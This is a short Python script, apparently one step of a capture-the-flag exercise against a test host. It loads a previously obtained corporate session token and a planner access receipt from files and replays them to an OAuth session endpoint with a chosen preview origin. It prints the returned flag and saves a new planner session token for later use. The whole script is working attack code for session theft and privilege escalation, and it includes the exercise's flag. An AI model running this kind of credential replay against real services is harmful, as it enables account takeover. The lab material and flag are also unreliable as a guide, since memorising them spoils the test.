```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planning = pathlib.Path("receipts/planner-handover").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "X-ARWC-Planning-Access": planning, "Content-Type": "application/json"}

body = json.dumps({
    "oauth_transaction": "OAUTH-PLN-882",
    "preview_origin": "https://preview-cinder.arwc.test",
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/sessions",
                            data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])   # PLN-SESS-OAUTH-882
print("flag:", d["flag"])                        # FLAG{4c5ffa1e2c3033e3}
print("planner_session (first 10):", d["planner_session"][:10])

pathlib.Path("receipts").mkdir(exist_ok=True)
pathlib.Path("receipts/planner-session").write_text(d["planner_session"])
```
